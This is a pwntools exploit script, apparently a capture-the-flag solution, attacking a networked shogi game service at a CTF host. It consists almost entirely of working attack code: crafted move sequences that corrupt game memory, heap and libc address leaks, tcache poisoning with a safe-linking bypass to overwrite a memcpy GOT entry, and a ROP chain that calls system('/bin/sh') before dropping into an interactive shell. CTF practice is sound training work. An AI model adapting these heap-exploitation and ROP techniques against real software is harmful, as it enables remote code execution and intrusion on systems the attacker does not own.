from pwn import *

###Util
def newGame(difficulty,moves,cmt):
    r.sendlineafter(b'Choice > ',b'1')
    r.sendlineafter(b'Choice > ',str(difficulty).encode())
    makeMove(moves)
    makeComment(cmt)

def makeMove(moves):
    kanjimap = [c.encode() for c in ['','一','二','三','四','五','六','七','八','九']]
    for move in moves:
        if type(move[0])!=tuple:
            if len(move)==2:
                movstr = move[0].encode()+b' '+str(move[1][0]).encode()+b' '+kanjimap[move[1][1]]
            else:
                movstr = move[0].encode()
        else:
            movstr = b' '+str(move[0][0]).encode()+b' '+kanjimap[move[0][1]]+b'  '+str(move[1][0]).encode()+b' '+kanjimap[move[1][1]]
        r.sendlineafter(b'Player > ',movstr)
        if b'Promote' in r.recvline():
            r.sendline(move[2].encode())

def makeComment(data):
    if type(data) is str:
        data = data.encode()
    r.sendlineafter(b'game > ',data)

def viewHist():
    r.sendlineafter(b'Choice > ',b'2')
    r.recvuntil(b'History')
    r.recvline()
    descs = r.recvuntil(b'\n\nSelect',drop=True).split('    ☖    game  '.encode())[1:]
    for i in range(len(descs)):
        descs[i] = descs[i].split(b' : ')[1][:-1]
    r.sendlineafter(b'Exit : \n',b'0')
    return descs

def deleteHist(idxs,leave=True):
    r.sendlineafter(b'Choice > ',b'3')
    idxs = sorted(idxs,reverse=True)
    for idx in idxs:
        r.sendlineafter(b'Exit : \n',str(idx).encode())
    if leave is True:
        r.sendlineafter(b'Exit : \n',b'0')

def overwritePayload(cnt):
    return [((1,9),(1,8)),
            ((2,8),(6,8)),
            ((6,7),(6,6)),
            ((6,6),(6,5)),
            ((6,8),(6,6)),
            ((6,6),(5,6)),
            ((5,6),(5,3),'yes'),
            ((3,9),(3,8)),
            ((6,5),(6,4)),
            ((5,3),(5,4)),
            ((3,8),(4,7)),
            ((5,4),(6,4)),
            ((6,4),(6,5)),
            ((6,5),(2,5)),
            ((2,5),(2,3)),
            ((7,7),(7,6)),
            ((8,8),(6,6)),
            ((6,6),(4,4)),
            ((4,4),(8,8)),
            ((2,3),(2,1)),
            ((2,1),(1,1)),
            ((1,1),(1,3)),
            ((1,3),(1,4)),
            ((1,4),(3,4)),
            ((5,7),(5,6)),
            ((5,6),(5,5)),
            ((5,5),(5,4)),
            ((5,4),(5,3),'yes'),
            ('打歩',(5,4)),
            ((5,4),(5,3),'no'),
            ((3,4),(2,4)),
            ((2,4),(2,1)),
            ('打歩',(4,3)),
            ((2,1),(1,1)),
            ((1,1),(2,1)),
            ('打歩',(5,2)),
            ((2,1),(3,1)),
            ((3,1),(4,1)),
            ((4,1),(6,1)),
            ((6,1),(7,2)),
            ((7,2),(8,2)),
            ((8,2),(8,1)),
            ((8,1),(9,2)),
            ((9,2),(9,1)),
            ('打銀',(8,1)),
            ((9,1),(8,1)),
            ((8,1),(8,3)),
            ((8,3),(7,3)),
            ((7,3),(9,3)),
            ((9,3),(6,3)),
            ((6,3),(6,1)),
            ('打歩',(4,2)),
            ((8,8),(4,4)),
            ((6,1),(9,1)),
            ('打銀',(4,1)),
            ((4,4),(5,3),'yes'),
            ((1,7),(1,6)),
            ((9,1),(7,1)),
            ('打歩',(4,2)),
            ((5,3),(5,4)),
            ((7,1),(9,1)),
            ((1,6),(1,5)),
            ((1,5),(1,4)),
            ((1,4),(1,3),'yes'),
            ((1,3),(2,2)),
            ((2,2),(3,2)),
            ((2,7),(2,6)),
            ((2,6),(2,5)),
            ((9,1),(7,1)),
            ((2,5),(2,4)),
            ((3,7),(3,6)),
            ((3,6),(3,5)),
            ((3,5),(3,4)),
            ((7,6),(7,5)),
            ((2,4),(2,3),'yes'),
            ((3,4),(3,3),'yes'),
            ((8,7),(8,6)),
            ((7,1),(9,1)),
            ((5,4),(8,1)),
            ((8,6),(8,5)),
            ((9,7),(9,6)),
            ((1,8),(1,7)),
            ((9,1),(7,1)),
            ((9,6),(9,5)),
            ((9,5),(9,4)),
            ((9,4),(9,3),'yes'),
            ((9,3),(8,2)),
            ((8,2),(9,2)),
            ((8,5),(8,4)),
            ((7,1),(9,1)),
            ('打金',(2,1)),
            ((8,4),(8,3),'yes'),
            ((2,9),(3,7)),
            ((9,1),(8,1)),
            ((8,1),(7,1)),
            ((7,5),(7,4)),
            ((7,4),(7,3),'yes'),
            ((7,3),(8,3)),
            ((8,3),(8,2)),
            ((8,2),(9,2)),
            ((3,7),(2,5)),
            ((7,1),(9,1)),
            ('打歩',(8,4)),
            ((8,4),(8,3),'yes'),
            ('打歩',(8,2)),
            ((8,2),(8,1),'yes'),
            ('打歩',(3,5)),
            ('打歩',(8,4)),
            ((8,4),(8,3),'yes'),
            ('打歩',(8,2)),
            ((8,2),(8,1),'yes'),
            ((9,1),(8,1)),
            ((8,1),(9,1)),
            ((9,1),(8,1)),
            ((8,1),(7,1)),
            ('打歩',(8,4)),
            ((8,4),(8,3),'yes'),
            ('打歩',(9,2)),
            ((9,2),(9,1),'yes'),
            ('打歩',(8,4)),
            ((9,1),(9,2)),
            ((8,4),(8,3),'yes'),
            ('打歩',(9,2)),
            ((9,2),(9,1),'yes'),
            ((9,1),(8,1)),
            ('打歩',(8,4)),
            ((8,4),(8,3),'yes'),
            ((2,5),(1,3),'yes'),
            ((8,3),(9,2)),
            ((8,9),(7,7)),
            ((7,1),(9,1)),
            ((1,3),(2,3)),
            ((7,7),(8,5)),
            ((8,5),(7,3),'no'),
            ((9,1),(7,1)),
            ('打銀',(8,9)),
            ((2,1),(2,2)),
            ((6,9),(6,8)),
            ((7,1),(9,1)),
            ('打銀',(1,9)),
            ((4,9),(3,9)),]+\
           [('打銀',(9,2)),
            ((9,1),(7,1)),
            ((7,1),(9,1))]*17+\
           [('打金',(2,9)),
            ((7,3),(8,1),'yes'),
            ((5,9),(4,9)),
            ((4,9),(5,9)),
            ((9,1),(7,1)),
            ('打金',(8,4)),
            ((7,1),(9,1))]+\
           [('打銀',(9,2)),
            ((9,1),(7,1)),
            ((7,1),(9,1))]*9+\
           [((8,4),(8,3)),
            ((8,3),(8,2)),
            ((8,2),(9,2)),
            ((9,1),(7,1)),
            ((7,1),(9,1))]+\
           [('打銀',(9,2)),
            ((9,1),(7,1)),
            ((7,1),(9,1))]*cnt+\
           [('投了',)]

def segmentize(payload):
    segments = []
    for i in range(len(payload)):
        if payload[i]==0:
            segments.append(payload[:i].replace(b'\x00',b'a'))
    if payload[-1]!=0:
        segments.append(payload.replace(b'\x00',b'a'))
    return segments[::-1]

###Addr
main_arena_offset = 0x219c80
unsorted_bin_offset = main_arena_offset+0x60
small_bin_offset = main_arena_offset+0xe0
L_memcpy_got_offset = 0x219160
system_offset = 0x50d70
bin_sh_offset = 0x1d8698

###ROPgadet
L_pop7_ret = 0x5a44e
L_pop_rdi = 0x2a3e5

###Exploit
r = remote('shogi.chal.2024.ctf.acsc.asia', 10101)

moves = [('投了',)]
newGame(2,moves,'a'*0xf0)

moves = [((1,9),(1,8)),('投了',)]
newGame(2,moves,'a'*0x10)
deleteHist([2])

fillup_size = (0xff,0xff,0xff,0xe0,0x90)
for size in fillup_size:
    moves = [('投了',)]
    newGame(2,moves,'a'*size)

'''
#FOR if game struct is malloced
for i in range(7):
    newGame(2)
    moves = [('投了',)]
    makeMove(moves)
    makeComment('a'*0x90)
#FOR if game struct is malloced
deleteHist([i+7 for i in range(7)]+[1])
deleteHist([5])
'''
deleteHist([1,6])

moves = [('投了',)]
newGame(2,moves,'a'*0x10)

###

newGame(2,overwritePayload(1),'a'*0xf0)

heap_addr = (u64(viewHist()[0].ljust(8,b'\x00'))<<12)-0x2000
print(hex(heap_addr))

newGame(2,overwritePayload(8),'a'*0x10)
deleteHist([1])

deleteHist([4,5,6])   #cleanup a bit

for i in range(5):
    moves = [('投了',)]
    newGame(2,moves,'a'*0xff)

deleteHist([1,2]+[i for i in range(5,9)])
deleteHist([1]) #set to first tcache chunk for later use
deleteHist([1])

moves = [('投了',)]
newGame(2,moves,'a'*0x80)

moves = [('投了',)]
newGame(2,moves,'a'*0x70)
deleteHist([2])

for i in range(7):
    moves = [('投了',)]
    newGame(2,moves,'a'*0x80)

deleteHist([i for i in range(1,9)])
deleteHist([1])

moves = [('投了',)]
newGame(2,moves,'a'*0x70)

newGame(2,overwritePayload(1),'a'*0x10)

small_bin_addr = u64(viewHist()[0]+b'\x00\x00')
libc_base = small_bin_addr-small_bin_offset
print(hex(libc_base))

newGame(2,overwritePayload(8),'a'*0x10)
deleteHist([1,2,3])

moves = [('投了',)]
newGame(2,moves,'a'*0x60)   #cleanup
deleteHist([1])

moves = [('投了',)]
newGame(2,moves,'a'*0xc0)   #cleanup
deleteHist([1])

moves = [('投了',)]
newGame(2,moves,'a'*0xd0)
deleteHist([1])

moves = [('投了',)]
newGame(2,moves,'a'*0x20)
deleteHist([1])

moves = [('投了',)]
newGame(2,moves,'a'*0x30)
deleteHist([1])

moves = [('投了',)]
newGame(2,moves,'a'*0xd0)
for i in range(7):
    moves = [('投了',)]
    newGame(2,moves,'a'*0xd0)
deleteHist([i for i in range(2,9)])
deleteHist([1])

for i in range(4):
    moves = [('投了',)]
    newGame(2,moves,'a'*0x60)
deleteHist([1,2,4])
deleteHist([1])

for i in range(2):
    moves = [('投了',)]
    newGame(2,moves,'a'*0x40)
deleteHist([1,2])

payload = b'a'*0x58+p64(0x51)
segments = segmentize(payload)
for segment in segments:
    moves = [('投了',)]
    newGame(2,moves,segment)
    deleteHist([1])

moves = [('投了',)]
newGame(2,moves,'a'*0x20)
newGame(2,overwritePayload(1),'a'*0x10)
deleteHist([1,2])

payload = b'a'*0x58+p64(0x51)+p64((libc_base+L_memcpy_got_offset-0x40)^((heap_addr+0x300)>>12)) #overwrite memcpy got
#payload = b'a'*0x58+p64(0x51)+p64((libc_base+0x98-0x38)^((heap_addr+0x300)>>12)) #overwrite strlen got (doesn't work since menu puts also calls strlen)
segments = segmentize(payload)
for segment in segments:
    moves = [('投了',)]
    newGame(2,moves,segment)
    deleteHist([1])

moves = [('投了',)]
newGame(2,moves,'a'*0x40)
moves = [('投了',)]
newGame(2,moves,b'a'*0x40+p64(libc_base+L_pop7_ret))
moves = [('投了',)]
ROPchain = p64(libc_base+L_pop_rdi)+p64(libc_base+bin_sh_offset)+\
           p64(libc_base+system_offset)
newGame(2,moves,ROPchain)

r.interactive()


'''
9  11 13 15 19 16 14 12 10
   18                17
0  1  2  3  4  5  6  7  8



20 21 22 23 24 25 26 27 28
   37                38
29 31 33 35 39 36 34 32 30

megR 20 -> [18
megB 20 -> [17
gold 20 -> [5,15,24,16
silv 20 -> [14,13  overwrite cnt to 21 (generate a lot of 0 silvers)
hors 20 -> [12,11 overwrite cnt to 
rook 20 -> [10,9
pawn 20 -> [4,3,7,8,6,1,2,0,23,25
'''
